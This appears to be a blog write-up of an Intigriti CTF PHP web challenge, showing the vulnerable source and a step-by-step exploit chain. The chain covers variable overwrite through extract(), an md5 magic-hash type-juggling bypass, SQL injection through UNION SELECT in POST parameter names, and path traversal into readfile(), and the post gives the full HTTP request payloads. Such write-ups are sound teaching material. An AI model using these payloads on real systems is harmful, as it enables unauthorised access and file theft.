I"û<p>In this post I‚Äôll discuss the first challenge our team solved as part of the Intigriti CTF. This was a php web challenge where we were given the source and asked to read the contents of the file to retrieve a flag.</p>

<!-- read more -->

<h2 id="initial-assessment">Initial Assessment</h2>
<p>The source code for the challenge can be seen below:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php  
    /*  
    &lt;flag&gt; ‚û°‚û°‚û° ‚õ≥üèÅ ‚¨Ö‚¨Ö‚¨Ö &lt;flag&gt;  
    */  
    if ($_SERVER['REQUEST_METHOD'] == 'POST'){  
	    extract($_POST);  
      
	    if (isset($_POST['password']) &amp;&amp; md5($_POST['password']) == 'put hash here!'){  
		    $loggedin = true;  
	    }  
      
	    if (md5($_SERVER['REMOTE_ADDR']) != '92d3fd4057d07f38474331ab231e1f0d'){  
	    header('Location: ' . $_SERVER['REQUEST_URI']);  
	    }  
	      
	    if (isset($loggedin) &amp;&amp; $loggedin){  
		    echo 'One step closer üòé&lt;br&gt;';  
	      
		    if (isset($_GET['action']) &amp;&amp; md5($_GET['action']) == $_GET['action']){  
			    echo 'Really? üòÖ&lt;br&gt;';  
			      
			    $db = new SQLite3('database.db');  
			    $sql_where = Array('1=0');  
			      
			    foreach ($_POST as $key =&gt; $data) {  
				    $sql_where[] = $db-&gt;escapeString($key) . "='" . $db-&gt;escapeString($data) . "'";  
			    }  
			      
			    $result = $db-&gt;querySingle('SELECT login FROM users WHERE ' . implode(' AND ', $sql_where));  
			      
			    if ($result == 'admin'){  
				    echo 'Last step ü§£&lt;br&gt;';  
			      
				    readfile(file_get_contents('php://input'));  
				}  
		    }  
	    }  
    }  
?&gt; 
</code></pre></div></div>

<p>We can see that this challenge will require us to bypass a number of conditional statements in order to execute the final readfile() function, where we will then need to modify our payload so that we can read a file.</p>

<h2 id="step-1-were-logged-in">Step 1: We‚Äôre Logged In!</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (isset($loggedin) &amp;&amp; $loggedin)
</code></pre></div></div>

<p>The first important conditional statement is checking if the $loggedin variable is true. We notice a suspicious usage of the extract() function above this. This function allows variables to be extracted from arrays. It‚Äôs being run on $_POST which is our POST input (user/attacker controlled). This will allow us to not only declare variable, but also to assign values to them using POST data.</p>

<p>We can simply pass a loggedin parameter with a value of true.</p>

<blockquote>
  <p>POST / HTTP/1.1 Host: phorrifyingp.ctf.intigriti.io Content-Type:
application/x-www-form-urlencoded Content-Length: 32</p>

  <p>loggedin=true</p>
</blockquote>

<p>Once sent, we see the confirmation on the page:</p>

<blockquote>
  <p>One step closer üòé</p>
</blockquote>

<h2 id="step-2-its-magic">Step 2: It‚Äôs Magic!</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (isset($_GET['action']) &amp;&amp; md5($_GET['action']) == $_GET['action'])
</code></pre></div></div>

<p>The next conditional statement is checking for a GET parameter named ‚Äúaction‚Äù. This parameter must satisfy the condition that its value is equal to its md5 value.</p>

<p>This seems very unlikely. In fact, it takes a little bit of understanding about php <a href="https://www.whitehatsec.com/blog/magic-hashes/">magic hashes</a> to understand how this condition could be satisfied.</p>

<p>In short, the use of ‚Äú==‚Äù allows for comparison of different object types. If we wanted to compare the literal value, we‚Äôd use ‚Äú===‚Äù. If we enter a String with a value such as ‚Äú0e1‚Äù, this will effectively equal 0 to the power of 1 (which is 0). In fact, 0 to the power of any number will always result in 0.</p>

<p>Using this logic, we simply need an input beginning with 0e and followed by a series of numbers which results in a md5 hash which also begins with 0e and is followed by a series of numbers.</p>

<p>Once such input is ‚Äú0e215962017‚Äù. The md5 value of which is ‚Äú0e291242476940776845150308577824‚Äù.</p>

<p>Placing this as a GET parameter, we will get one step closer.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?action=0e215962017 HTTP/2
Host: phorrifyingp.ctf.intigriti.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

loggedin=true
</code></pre></div></div>

<p>We get the confirmation:</p>

<blockquote>
  <p>Really? üòÖ</p>
</blockquote>

<h2 id="step-3-state-of-the-union">Step 3: State Of The Union</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if ($result == 'admin')
</code></pre></div></div>

<p>The last conditional statement checks if $result is equal to ‚Äòadmin‚Äô. This value comes from a SQL statement. Each of the parameters we pass in our POST data will become a part of this query. They are joined with the ‚ÄòAND‚Äô condition. The clause array is initially populated with ‚Äú1=0‚Äù which can never be true.</p>

<p>Firstly, we encounter errors about ‚Äúno such column loggedin‚Äù, which hints that we‚Äôll need to find a way to get rid of this part of the query, we can do so by commenting it out.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1--=aaaa&amp;loggedin=true
</code></pre></div></div>

<p>Next, we notice that the current state of the query will never be true due to the ‚Äú1=0‚Äù condition. This hints towards us using a UNION query to separately select the ‚Äúadmin‚Äù entry. We inject this into the parameter name.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?action=0e215962017 HTTP/2
Host: phorrifyingp.ctf.intigriti.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

1/**/UNION/**/SELECT/**/"admin"--=aaaa&amp;loggedin=true
</code></pre></div></div>

<p>We receive the confirmation that we have bypassed this check:</p>

<blockquote>
  <p>Last step ü§£</p>
</blockquote>

<h2 id="step-4-traversing-the-plane">Step 4: Traversing The Plane</h2>

<blockquote>
  <p>Warning&lt;/b&gt;: 
readfile(1/**/UNION/**/SELECT/**/"admin"‚Äì=aaaa&amp;loggedin=true):
failed to open stream: No such file or directory in
/var/www/html/index.php</p>
</blockquote>

<p>As we can see from the error above, the entire POST data payload is being sent into the readfile() function.</p>

<p>We can enter invalid directories, as long as we traverse back out of them. Using ‚Äú..‚Äù we are in effect removing it from the path <strong>before</strong> it is ever searched for.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?action=0e215962017 HTTP/2
Host: phorrifyingp.ctf.intigriti.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 108

1/**/UNION/**/SELECT/**/"admin"--=a&amp;loggedin=true&amp;test=/../../../../../../../../../../var/www/html/index.php
</code></pre></div></div>

<p>And we get the flag:</p>

<blockquote>
  <p>1337UP{PHP_SCARES_ME_IT_HAUNTS_ME_WHEN_I_SLEEP_ALL_I_CAN_SEE_IS_PHP_PLEASE_SOMEONE_HELP_ME}</p>
</blockquote>

<h2 id="final-notes">Final Notes</h2>
<p>Thanks to all members of ‚ÄúTeam Ireland Without RE‚Äù with special thanks to <a href="https://twitter.com/0daystolive">@0daystolive</a>.</p>
:ET